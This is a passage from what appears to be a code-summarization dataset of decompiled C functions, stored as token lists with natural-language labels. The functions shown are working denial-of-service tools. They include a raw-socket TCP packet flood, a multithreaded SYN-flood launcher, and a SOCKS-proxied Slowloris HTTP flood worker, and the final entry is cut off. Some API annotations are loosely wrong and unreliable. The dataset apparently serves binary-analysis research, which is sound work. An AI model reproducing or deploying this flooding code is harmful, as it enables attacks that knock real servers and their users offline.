            "__int64",
            "v1",
            ";",
            "int",
            "v2",
            ";",
            "__int16",
            "v3",
            ";",
            "int",
            "v5",
            ";",
            "int",
            "fd",
            ";",
            "int",
            "v7",
            ";",
            "int",
            "v8",
            ";",
            "int",
            "v9",
            ";",
            "_DWORD",
            "*",
            "v10",
            ";",
            "__int16",
            "*",
            "v11",
            ";",
            "uint16_t",
            "*",
            "v12",
            ";",
            "void",
            "*",
            "optval",
            ";",
            "struct",
            "sockaddr",
            "addr",
            ";",
            "__int16",
            "s",
            "[",
            "8",
            "]",
            ";",
            "__int64",
            "v16",
            "[",
            "512",
            "]",
            ";",
            "v16",
            "[",
            "511",
            "]",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v10",
            "=",
            "a1",
            ";",
            "v11",
            "=",
            "s",
            ";",
            "v12",
            "=",
            "(",
            "uint16_t",
            "*",
            ")",
            "v16",
            "+",
            "2",
            ";",
            "v1",
            "=",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "a1",
            "+",
            "2",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "addr",
            ".",
            "sa_family",
            "=",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "a1",
            "+",
            "1",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "addr",
            ".",
            "sa_data",
            "[",
            "6",
            "]",
            "=",
            "v1",
            ";",
            "fd",
            "=",
            "socket",
            "(",
            "2",
            ",",
            "3",
            ",",
            "6",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "<",
            "0",
            ")",
            "{",
            "fwrite",
            "(",
            "\"Could not open raw socket.\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x1BuL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "exit",
            "(",
            "-",
            "1",
            ")",
            ";",
            "}",
            "v7",
            "=",
            "v10",
            "[",
            "1",
            "]",
            ";",
            "memset",
            "(",
            "s",
            ",",
            "0",
            ",",
            "0x1000uL",
            "L",
            ")",
            ";",
            "setup_ip_header",
            "(",
            "(",
            "__int64",
            ")",
            "v11",
            ")",
            ";",
            "setup_tcp_header",
            "(",
            "(",
            "__int64",
            ")",
            "v12",
            ")",
            ";",
            "v12",
            "[",
            "1",
            "]",
            "=",
            "htons",
            "(",
            "v7",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "v11",
            "+",
            "4",
            ")",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "&",
            "addr",
            ".",
            "sa_data",
            "[",
            "2",
            "]",
            ";",
            "v11",
            "[",
            "5",
            "]",
            "=",
            "csum",
            "(",
            "(",
            "unsigned",
            "__int16",
            "*",
            ")",
            "s",
            ",",
            "(",
            "unsigned",
            "__int16",
            ")",
            "v11",
            "[",
            "1",
            "]",
            ">",
            ">",
            "1",
            ")",
            ";",
            "v5",
            "=",
            "1",
            ";",
            "optval",
            "=",
            "&",
            "v5",
            ";",
            "if",
            "(",
            "setsockopt",
            "(",
            "fd",
            ",",
            "0",
            ",",
            "3",
            ",",
            "&",
            "v5",
            ",",
            "4u",
            ")",
            "<",
            "0",
            ")",
            "{",
            "fwrite",
            "(",
            "\"Error: setsockopt() - Cannot set HDRINCL!\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x2AuL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "exit",
            "(",
            "-",
            "1",
            ")",
            ";",
            "}",
            "v2",
            "=",
            "time",
            "(",
            "0L",
            "L",
            ")",
            ";",
            "init_rand",
            "(",
            "v2",
            ")",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "sendto",
            "(",
            "fd",
            ",",
            "s",
            ",",
            "(",
            "unsigned",
            "__int16",
            ")",
            "v11",
            "[",
            "1",
            "]",
            ",",
            "0",
            ",",
            "&",
            "addr",
            ",",
            "0x10u",
            ")",
            ";",
            "sendto",
            "(",
            "fd",
            ",",
            "s",
            ",",
            "(",
            "unsigned",
            "__int16",
            ")",
            "v11",
            "[",
            "1",
            "]",
            ",",
            "0",
            ",",
            "&",
            "addr",
            ",",
            "0x10u",
            ")",
            ";",
            "sendto",
            "(",
            "fd",
            ",",
            "s",
            ",",
            "(",
            "unsigned",
            "__int16",
            ")",
            "v11",
            "[",
            "1",
            "]",
            ",",
            "0",
            ",",
            "&",
            "addr",
            ",",
            "0x10u",
            ")",
            ";",
            "sendto",
            "(",
            "fd",
            ",",
            "s",
            ",",
            "(",
            "unsigned",
            "__int16",
            ")",
            "v11",
            "[",
            "1",
            "]",
            ",",
            "0",
            ",",
            "&",
            "addr",
            ",",
            "0x10u",
            ")",
            ";",
            "sendto",
            "(",
            "fd",
            ",",
            "s",
            ",",
            "(",
            "unsigned",
            "__int16",
            ")",
            "v11",
            "[",
            "1",
            "]",
            ",",
            "0",
            ",",
            "&",
            "addr",
            ",",
            "0x10u",
            ")",
            ";",
            "sendto",
            "(",
            "fd",
            ",",
            "s",
            ",",
            "(",
            "unsigned",
            "__int16",
            ")",
            "v11",
            "[",
            "1",
            "]",
            ",",
            "0",
            ",",
            "&",
            "addr",
            ",",
            "0x10u",
            ")",
            ";",
            "sendto",
            "(",
            "fd",
            ",",
            "s",
            ",",
            "(",
            "unsigned",
            "__int16",
            ")",
            "v11",
            "[",
            "1",
            "]",
            ",",
            "0",
            ",",
            "&",
            "addr",
            ",",
            "0x10u",
            ")",
            ";",
            "sendto",
            "(",
            "fd",
            ",",
            "s",
            ",",
            "(",
            "unsigned",
            "__int16",
            ")",
            "v11",
            "[",
            "1",
            "]",
            ",",
            "0",
            ",",
            "&",
            "addr",
            ",",
            "0x10u",
            ")",
            ";",
            "sendto",
            "(",
            "fd",
            ",",
            "s",
            ",",
            "(",
            "unsigned",
            "__int16",
            ")",
            "v11",
            "[",
            "1",
            "]",
            ",",
            "0",
            ",",
            "&",
            "addr",
            ",",
            "0x10u",
            ")",
            ";",
            "sendto",
            "(",
            "fd",
            ",",
            "s",
            ",",
            "(",
            "unsigned",
            "__int16",
            ")",
            "v11",
            "[",
            "1",
            "]",
            ",",
            "0",
            ",",
            "&",
            "addr",
            ",",
            "0x10u",
            ")",
            ";",
            "sendto",
            "(",
            "fd",
            ",",
            "s",
            ",",
            "(",
            "unsigned",
            "__int16",
            ")",
            "v11",
            "[",
            "1",
            "]",
            ",",
            "0",
            ",",
            "&",
            "addr",
            ",",
            "0x10u",
            ")",
            ";",
            "sendto",
            "(",
            "fd",
            ",",
            "s",
            ",",
            "(",
            "unsigned",
            "__int16",
            ")",
            "v11",
            "[",
            "1",
            "]",
            ",",
            "0",
            ",",
            "&",
            "addr",
            ",",
            "0x10u",
            ")",
            ";",
            "sendto",
            "(",
            "fd",
            ",",
            "s",
            ",",
            "(",
            "unsigned",
            "__int16",
            ")",
            "v11",
            "[",
            "1",
            "]",
            ",",
            "0",
            ",",
            "&",
            "addr",
            ",",
            "0x10u",
            ")",
            ";",
            "sendto",
            "(",
            "fd",
            ",",
            "s",
            ",",
            "(",
            "unsigned",
            "__int16",
            ")",
            "v11",
            "[",
            "1",
            "]",
            ",",
            "0",
            ",",
            "&",
            "addr",
            ",",
            "0x10u",
            ")",
            ";",
            "sendto",
            "(",
            "fd",
            ",",
            "s",
            ",",
            "(",
            "unsigned",
            "__int16",
            ")",
            "v11",
            "[",
            "1",
            "]",
            ",",
            "0",
            ",",
            "&",
            "addr",
            ",",
            "0x10u",
            ")",
            ";",
            "sendto",
            "(",
            "fd",
            ",",
            "s",
            ",",
            "(",
            "unsigned",
            "__int16",
            ")",
            "v11",
            "[",
            "1",
            "]",
            ",",
            "0",
            ",",
            "&",
            "addr",
            ",",
            "0x10u",
            ")",
            ";",
            "sendto",
            "(",
            "fd",
            ",",
            "s",
            ",",
            "(",
            "unsigned",
            "__int16",
            ")",
            "v11",
            "[",
            "1",
            "]",
            ",",
            "0",
            ",",
            "&",
            "addr",
            ",",
            "0x10u",
            ")",
            ";",
            "sendto",
            "(",
            "fd",
            ",",
            "s",
            ",",
            "(",
            "unsigned",
            "__int16",
            ")",
            "v11",
            "[",
            "1",
            "]",
            ",",
            "0",
            ",",
            "&",
            "addr",
            ",",
            "0x10u",
            ")",
            ";",
            "sendto",
            "(",
            "fd",
            ",",
            "s",
            ",",
            "(",
            "unsigned",
            "__int16",
            ")",
            "v11",
            "[",
            "1",
            "]",
            ",",
            "0",
            ",",
            "&",
            "addr",
            ",",
            "0x10u",
            ")",
            ";",
            "sendto",
            "(",
            "fd",
            ",",
            "s",
            ",",
            "(",
            "unsigned",
            "__int16",
            ")",
            "v11",
            "[",
            "1",
            "]",
            ",",
            "0",
            ",",
            "&",
            "addr",
            ",",
            "0x10u",
            ")",
            ";",
            "v8",
            "=",
            "rand_cmwc",
            "(",
            ")",
            ";",
            "v9",
            "=",
            "v8",
            ";",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "v11",
            "+",
            "3",
            ")",
            "=",
            "v8",
            ";",
            "*",
            "v12",
            "=",
            "htons",
            "(",
            "v8",
            ")",
            ";",
            "v3",
            "=",
            "csum",
            "(",
            "(",
            "unsigned",
            "__int16",
            "*",
            ")",
            "s",
            ",",
            "(",
            "unsigned",
            "__int16",
            ")",
            "v11",
            "[",
            "1",
            "]",
            ">",
            ">",
            "1",
            ")",
            ";",
            "v11",
            "[",
            "5",
            "]",
            "=",
            "v3",
            ";",
            "if",
            "(",
            "STOPFLAG",
            ")",
            "break",
            ";",
            "sleep",
            "(",
            "3u",
            ")",
            ";",
            "}",
            "return",
            "close",
            "(",
            "fd",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `readfsqword` is likely intended to read a quadword (64-bit) value from the FS segment register, commonly used in low-level programming for accessing thread-local storage or other system-specific data structures, and is associated with the provided code snippets defining various processor control and optimization intrinsics.",
            "The function \"setup\" likely initializes various aspects of a system or application, including X server event handlers, IPC command handlers, key bindings, and possibly hardware peripherals like GPIO pins, in order to prepare the system for operation."
        ],
        "longer_label": "The provided code is a function written in C that likely performs flooding via raw sockets, utilizing low-level system operations such as reading from the FS segment register and setting up IP and TCP headers, while including error handling and a loop with a sleep condition."
    },
    {
        "id": 393,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "to",
            "flood",
            "a",
            "server",
            "with",
            "HTTP",
            "requests",
            "using",
            "SOCKS4",
            "and",
            "SOCKS5",
            "proxies",
            ",",
            "sending",
            "headers",
            "with",
            "random",
            "characters",
            "at",
            "intervals",
            "and",
            "sleeping",
            "for",
            "1",
            "second",
            ",",
            "and",
            "closing",
            "the",
            "server",
            "socket",
            "after",
            "each",
            "request",
            "."
        ],
        "code_tokens": [
            "void",
            "__fastcall",
            "FUN0",
            "flood_with_syn",
            "(",
            "char",
            "*",
            "a1",
            ",",
            "signed",
            "__int16",
            "a2",
            ",",
            "int",
            "a3",
            ",",
            "int",
            "a4",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v4",
            ";",
            "void",
            "*",
            "v5",
            ";",
            "unsigned",
            "__int64",
            "v6",
            ";",
            "void",
            "*",
            "v7",
            ";",
            "_BYTE",
            "*",
            "v8",
            ";",
            "__int64",
            "v9",
            ";",
            "_BYTE",
            "v10",
            "[",
            "12",
            "]",
            ";",
            "int",
            "fd",
            ";",
            "int",
            "v12",
            ";",
            "signed",
            "__int16",
            "v13",
            ";",
            "char",
            "*",
            "cp",
            ";",
            "int",
            "i",
            ";",
            "__int64",
            "v16",
            ";",
            "_BYTE",
            "*",
            "v17",
            ";",
            "__int64",
            "v18",
            ";",
            "_BYTE",
            "*",
            "v19",
            ";",
            "__int64",
            "v20",
            ";",
            "__int64",
            "v21",
            ";",
            "char",
            "buf",
            "[",
            "10",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v23",
            ";",
            "cp",
            "=",
            "a1",
            ";",
            "v12",
            "=",
            "a3",
            ";",
            "fd",
            "=",
            "a4",
            ";",
            "v13",
            "=",
            "a2",
            ";",
            "v23",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v16",
            "=",
            "a3",
            "-",
            "1L",
            "L",
            ";",
            "v4",
            "=",
            "16",
            "*",
            "(",
            "(",
            "8L",
            "L",
            "*",
            "a3",
            "+",
            "15",
            ")",
            "/",
            "0x10uL",
            "L",
            ")",
            ";",
            "while",
            "(",
            "v10",
            "!",
            "=",
            "&",
            "v10",
            "[",
            "-",
            "(",
            "v4",
            "&",
            "0xFFFFFFFFFFFFF000L",
            "L",
            ")",
            "]",
            ")",
            ";",
            "v5",
            "=",
            "alloca",
            "(",
            "v4",
            "&",
            "0xFFF",
            ")",
            ";",
            "if",
            "(",
            "(",
            "v4",
            "&",
            "0xFFF",
            ")",
            "!",
            "=",
            "0",
            ")",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "v10",
            "[",
            "(",
            "v4",
            "&",
            "0xFFF",
            ")",
            "-",
            "8",
            "]",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "v10",
            "[",
            "(",
            "v4",
            "&",
            "0xFFF",
            ")",
            "-",
            "8",
            "]",
            ";",
            "v17",
            "=",
            "v10",
            ";",
            "LOWORD",
            "(",
            "v20",
            ")",
            "=",
            "2",
            ";",
            "WORD1",
            "(",
            "v20",
            ")",
            "=",
            "htons",
            "(",
            "v13",
            ")",
            ";",
            "HIDWORD",
            "(",
            "v20",
            ")",
            "=",
            "inet_addr",
            "(",
            "cp",
            ")",
            ";",
            "v18",
            "=",
            "v12",
            "-",
            "1L",
            "L",
            ";",
            "v6",
            "=",
            "16",
            "*",
            "(",
            "(",
            "24L",
            "L",
            "*",
            "v12",
            "+",
            "15",
            ")",
            "/",
            "0x10uL",
            "L",
            ")",
            ";",
            "while",
            "(",
            "v10",
            "!",
            "=",
            "&",
            "v10",
            "[",
            "-",
            "(",
            "v6",
            "&",
            "0xFFFFFFFFFFFFF000L",
            "L",
            ")",
            "]",
            ")",
            ";",
            "v7",
            "=",
            "alloca",
            "(",
            "v6",
            "&",
            "0xFFF",
            ")",
            ";",
            "if",
            "(",
            "(",
            "v6",
            "&",
            "0xFFF",
            ")",
            "!",
            "=",
            "0",
            ")",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "v10",
            "[",
            "(",
            "v6",
            "&",
            "0xFFF",
            ")",
            "-",
            "8",
            "]",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "v10",
            "[",
            "(",
            "v6",
            "&",
            "0xFFF",
            ")",
            "-",
            "8",
            "]",
            ";",
            "v19",
            "=",
            "v10",
            ";",
            "fwrite",
            "(",
            "\"Starting the SYN-FLOOD\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x17uL",
            "L",
            ",",
            "stdout",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "v12",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "&",
            "v19",
            "[",
            "24",
            "*",
            "i",
            "]",
            "=",
            "i",
            ";",
            "v8",
            "=",
            "&",
            "v19",
            "[",
            "24",
            "*",
            "i",
            "]",
            ";",
            "v9",
            "=",
            "v21",
            ";",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "v8",
            "+",
            "1",
            ")",
            "=",
            "v20",
            ";",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "v8",
            "+",
            "2",
            ")",
            "=",
            "v9",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "&",
            "v19",
            "[",
            "24",
            "*",
            "i",
            "+",
            "4",
            "]",
            "=",
            "v13",
            ";",
            "pthread_create",
            "(",
            "(",
            "pthread_t",
            "*",
            ")",
            "&",
            "v17",
            "[",
            "8",
            "*",
            "i",
            "]",
            ",",
            "0L",
            "L",
            ",",
            "(",
            "void",
            "*",
            "(",
            "*",
            ")",
            "(",
            "void",
            "*",
            ")",
            ")",
            "flood",
            ",",
            "&",
            "v19",
            "[",
            "24",
            "*",
            "i",
            "]",
            ")",
            ";",
            "}",
            "do",
            "{",
            "sleep",
            "(",
            "4u",
            ")",
            ";",
            "read",
            "(",
            "fd",
            ",",
            "buf",
            ",",
            "9uL",
            "L",
            ")",
            ";",
            "}",
            "while",
            "(",
            "strncmp",
            "(",
            "buf",
            ",",
            "\"EXIT\"",
            ",",
            "4uL",
            "L",
            ")",
            ")",
            ";",
            "STOPFLAG",
            "=",
            "1",
            ";",
            "close",
            "(",
            "fd",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "v12",
            ";",
            "+",
            "+",
            "i",
            ")",
            "pthread_join",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "v17",
            "[",
            "8",
            "*",
            "i",
            "]",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "puts",
            "(",
            "\"All Thread's Exited\"",
            ")",
            ";",
            "_exit",
            "(",
            "0",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsq` is likely utilized to read a 64-bit value from the FS segment register, commonly used in low-level programming for accessing thread-local storage or kernel data structures."
        ],
        "longer_label": "The provided code implements a function `flood_with_syn` that performs SYN flooding using multithreading, establishing multiple TCP connections to flood a target IP address and port, while also handling synchronization and termination via shared memory and inter-process communication."
    },
    {
        "id": 394,
        "docstring_tokens": [
            "The",
            "code",
            "establishes",
            "a",
            "TCP",
            "socket",
            "connection",
            "to",
            "a",
            "specified",
            "IP",
            "address",
            "and",
            "sends",
            "a",
            "GET",
            "request",
            "with",
            "parameters",
            ",",
            "receives",
            "the",
            "response",
            ",",
            "and",
            "then",
            "closes",
            "the",
            "connection",
            "."
        ],
        "code_tokens": [
            "void",
            "*",
            "FUN0",
            "flood_SL",
            "(",
            "void",
            "*",
            "a1",
            ")",
            "{",
            "size_t",
            "v1",
            ";",
            "__int64",
            "v2",
            ";",
            "__int64",
            "v3",
            ";",
            "__int64",
            "v4",
            ";",
            "unsigned",
            "int",
            "v5",
            ";",
            "unsigned",
            "int",
            "v6",
            ";",
            "char",
            "v7",
            ";",
            "size_t",
            "v8",
            ";",
            "unsigned",
            "int",
            "v10",
            ";",
            "int",
            "optval",
            ";",
            "int",
            "v12",
            ";",
            "int",
            "v13",
            ";",
            "int",
            "fd",
            ";",
            "const",
            "char",
            "*",
            "*",
            "*",
            "v15",
            ";",
            "char",
            "*",
            "v16",
            ";",
            "char",
            "*",
            "v17",
            ";",
            "struct",
            "sockaddr",
            "s",
            ";",
            "char",
            "buf",
            ";",
            "char",
            "v20",
            ";",
            "uint16_t",
            "v21",
            ";",
            "__int64",
            "v22",
            ";",
            "unsigned",
            "__int64",
            "v23",
            ";",
            "v23",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v15",
            "=",
            "(",
            "const",
            "char",
            "*",
            "*",
            "*",
            ")",
            "a1",
            ";",
            "signal",
            "(",
            "13",
            ",",
            "(",
            "__sighandler_t",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "&",
            "dword_0",
            "+",
            "1",
            ")",
            ")",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "while",
            "(",
            "1",
            ")",
            "{",
            "while",
            "(",
            "1",
            ")",
            "{",
            "while",
            "(",
            "1",
            ")",
            "{",
            "LABEL_2",
            ":",
            "while",
            "(",
            "1",
            ")",
            "{",
            "v13",
            "=",
            "0",
            ";",
            "if",
            "(",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "*",
            "v15",
            "+",
            "5",
            ")",
            ")",
            "break",
            ";",
            "v15",
            "=",
            "(",
            "const",
            "char",
            "*",
            "*",
            "*",
            ")",
            "v15",
            "[",
            "2",
            "]",
            ";",
            "sleep",
            "(",
            "1u",
            ")",
            ";",
            "}",
            "memset",
            "(",
            "&",
            "s",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "s",
            ")",
            ")",
            ";",
            "s",
            ".",
            "sa_family",
            "=",
            "2",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "s",
            ".",
            "sa_data",
            "=",
            "htons",
            "(",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "*",
            "v15",
            "+",
            "4",
            ")",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "&",
            "s",
            ".",
            "sa_data",
            "[",
            "2",
            "]",
            "=",
            "inet_addr",
            "(",
            "(",
            "*",
            "v15",
            ")",
            "[",
            "1",
            "]",
            ")",
            ";",
            "fd",
            "=",
            "socket",
            "(",
            "2",
            ",",
            "1",
            ",",
            "6",
            ")",
            ";",
            "optval",
            "=",
            "1",
            ";",
            "setsockopt",
            "(",
            "fd",
            ",",
            "1",
            ",",
            "2",
            ",",
            "&",
            "optval",
            ",",
            "4u",
            ")",
            ";",
            "if",
            "(",
            "connect",
            "(",
            "fd",
            ",",
            "&",
            "s",
            ",",
            "0x10u",
            ")",
            "<",
            "=",
            "0",
            ")",
            "break",
            ";",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "*",
            "v15",
            "+",
            "5",
            ")",
            "=",
            "0",
            ";",
            "v15",
            "=",
            "(",
            "const",
            "char",
            "*",
            "*",
            "*",
            ")",
            "v15",
            "[",
            "2",
            "]",
            ";",
            "}",
            "if",
            "(",
            "strcmp",
            "(",
            "*",
            "*",
            "v15",
            ",",
            "\"Socks4\"",
            ")",
            ")",
            "break",
            ";",
            "buf",
            "=",
            "4",
            ";",
            "v20",
            "=",
            "1",
            ";",
            "v21",
            "=",
            "htons",
            "(",
            "0x50u",
            ")",
            ";",
            "v22",
            "=",
            "inet_addr",
            "(",
            "ipstr",
            ")",
            ";",
            "BYTE4",
            "(",
            "v22",
            ")",
            "=",
            "0",
            ";",
            "if",
            "(",
            "send",
            "(",
            "fd",
            ",",
            "&",
            "buf",
            ",",
            "9uL",
            "L",
            ",",
            "0x4000",
            ")",
            "=",
            "=",
            "9",
            ")",
            "break",
            ";",
            "LABEL_8",
            ":",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "*",
            "v15",
            "+",
            "5",
            ")",
            "=",
            "0",
            ";",
            "v15",
            "=",
            "(",
            "const",
            "char",
            "*",
            "*",
            "*",
            ")",
            "v15",
            "[",
            "2",
            "]",
            ";",
            "close",
            "(",
            "fd",
            ")",
            ";",
            "}",
            "if",
            "(",
            "strcmp",
            "(",
            "*",
            "*",
            "v15",
            ",",
            "\"Socks5\"",
            ")",
            ")",
            "break",
            ";",
            "buf",
            "=",
            "5",
            ";",
            "v20",
            "=",
            "1",
            ";",
            "LOBYTE",
            "(",
            "v21",
            ")",
            "=",
            "0",
            ";",
            "v13",
            "=",
            "send",
            "(",
            "fd",
            ",",
            "&",
            "buf",
            ",",
            "3uL",
            "L",
            ",",
            "0x4000",
            ")",
            ";",
            "if",
            "(",
            "v13",
            "<",
            "0",
            ")",
            "goto",
            "LABEL_8",
            ";",
            "buf",
            "=",
            "5",
            ";",
            "v20",
            "=",
            "1",
            ";",
            "v21",
            "=",
            "256",
            ";",
            "v22",
            "=",
            "inet_addr",
            "(",
            "ipstr",
            ")",
            ";",
            "WORD2",
            "(",
            "v22",
            ")",
            "=",
            "htons",
            "(",
            "0x50u",
            ")",
            ";",
            "v13",
            "=",
            "send",
            "(",
            "fd",
            ",",
            "&",
            "buf",
            ",",
            "0xAuL",
            "L",
            ",",
            "0x4000",
            ")",
            ";",
            "if",
            "(",
            "v13",
            ">",
            "=",
            "0",
            ")",
            "break",
            ";",
            "printf",
            "(",
            "\"BAD PROXY ONLY SENT %d:%d\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v13",
            ",",
            "10L",
            "L",
            ")",
            ";",
            "perror",
            "(",
            "\"send 10\"",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "*",
            "v15",
            "+",
            "5",
            ")",
            "=",
            "0",
            ";",
            "v15",
            "=",
            "(",
            "const",
            "char",
            "*",
            "*",
            "*",
            ")",
            "v15",
            "[",
            "2",
            "]",
            ";",
            "close",
            "(",
            "fd",
            ")",
            ";",
            "}",
            "v16",
            "=",
            "str_replace",
            "(",
            "postpayload",
            ",",
            "\"#useragent#\"",
            ",",
            "(",
            "const",
            "char",
            "*",
            ")",
            "v15",
            "[",
            "1",
            "]",
            ")",
            ";",
            "if",
            "(",
            "v16",
            ")",
            "break",
            ";",
            "v15",
            "=",
            "(",
            "const",
            "char",
            "*",
            "*",
            "*",
            ")",
            "v15",
            "[",
            "2",
            "]",
            ";",
            "close",
            "(",
            "fd",
            ")",
            ";",
            "}",
            "v1",
            "=",
            "strlen",
            "(",
            "v16",
            ")",
            ";",
            "v13",
            "=",
            "send",
            "(",
            "fd",
            ",",
            "v16",
            ",",
            "v1",
            ",",
            "0x4000",
            ")",
            ";",
            "free",
            "(",
            "v16",
            ")",
            ";",
            "v12",
            "=",
            "1",
            ";",
            "do",
            "{",
            "if",
            "(",
            "v12",
            "<",
            "=",
            "0",
            ")",
            "{",
            "close",
            "(",
            "fd",
            ")",
            ";",
            "usleep",
            "(",
            "0x7530u",
            ")",
            ";",
            "goto",
            "LABEL_2",
            ";",
            "}",
            "v17",
            "=",
            "(",
            "char",
            "*",
            ")",
            "malloc",
            "(",
            "0xFFuL",
            "L",
            ")",
            ";",
            "v2",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "char",
            ")",
            "(",
            "rand",
            "(",
            ")",
            "%",
            "26",
            "+",
            "97",
            ")",
            ";",
            "v3",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "char",
            ")",
            "(",
            "rand",
            "(",
            ")",
            "%",
            "26",
            "+",
            "97",
            ")",
            ";",
            "v4",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "char",
            ")",
            "(",
            "rand",
            "(",
            ")",
            "%",
            "26",
            "+",
            "97",
            ")",
            ";",
            "v10",
            "=",
            "(",
            "char",
            ")",
            "(",
            "rand",
            "(",
            ")",
            "%",
            "26",
            "+",
            "97",
            ")",
            ";",
            "v5",
            "=",
            "(",
            "char",
            ")",
            "(",
            "rand",
            "(",
            ")",
            "%",
            "26",
            "+",
            "97",
            ")",
            ";",
            "v6",
            "=",
            "(",
            "char",
            ")",
            "(",
            "rand",
            "(",
            ")",
            "%",
            "26",
            "+",
            "97",
            ")",
            ";",
            "v7",
            "=",
            "rand",
            "(",
            ")",
            ";",
            "sprintf",
            "(",
            "v17",
            ",",
            "\"X-%c%c%c%c%c%c%c: 1\\r\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "char",
            ")",
            "(",
            "v7",
            "%",
            "26",
            "+",
            "97",
            ")",
            ",",
            "v6",
            ",",
            "v5",
            ",",
            "v10",
            ",",
            "v4",
            ",",
            "v3",
            ",",
            "v2",
            ")",
            ";",
            "v8",
            "=",
            "strlen",
            "(",
            "v17",
            ")",
            ";",
            "v12",
            "=",
            "send",
            "(",
            "fd",
            ",",
            "v17",
            ",",
            "v8",
            ",",
            "0x4000",
            ")",
            ";",
            "free",
            "(",
            "v17",
            ")",
            ";",
            "sleep",
            "(",
            "1u",
            ")",
            ";",
            "}",
            "while",
            "(",
            "!",
            "STOP_FLAG_SL",
            ")",
            ";",
            "close",
            "(",
            "fd",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"__read\" function seems to be used for reading data from devices, files, or potentially other sources, handling different operations such as reading from a device, performing file I/O, and interacting with a dump file or shared library, depending on the context in which it's called.",
            "The function \"qword\" likely manipulates or interacts with quad-word (64-bit) data types in a programming context.",
            "The `htons` function is used to convert a 16-bit quantity from host byte order to network byte order (big-endian), facilitating proper communication between systems with different byte orderings."
        ],
        "longer_label": "The provided code appears to be a function for flooding a SOCKS proxy server with requests, utilizing both SOCKS4 and SOCKS5 protocols, as well as generating random HTTP headers, with potential interactions with network-related functions such as socket creation, connection, and data transmission, alongside device interaction and manipulation of quad-word data types, with annotations highlighting specific functions used within the code."
    },
    {
        "id": 395,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "called",
            "flood_slow_loris",
            "that",
            "reads",
            "proxy",
            "information",
            "from",
            "a",
            "file",
            ",",
            "sets",
            "resource",
            "limits",
            ",",
            "parses",
            "a",
            "URL",
            ",",
            "creates",
            "threads",
            "to",
            "perform",
            "a",
            "Slowloris",
            "attack",
            ",",
            "and",
            "waits",
            "for",
            "a",
            "signal",
            "to",
            "stop",
            "the",
            "attack",
            "before",
            "exiting",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "unsigned",
            "int",
            "a1",
            ")",
            "{",
            "unsigned",
            "int",
            "v1",
            ";",
            "size_t",
            "v2",
            ";",
            "int",
            "i",
            ";",
            "int",
            "fd",
            ";",
            "int",
            "v6",
            ";",
            "int",
            "v7",
            ";",
            "struct",
            "sockaddr",
            "*",
            "addr",
            ";",
            "char",
            "cp",
            "[",
            "1037",
            "]",
            ";",
            "char",
            "s",
            "[",
            "1032",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v11",
            ";",
            "v11",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
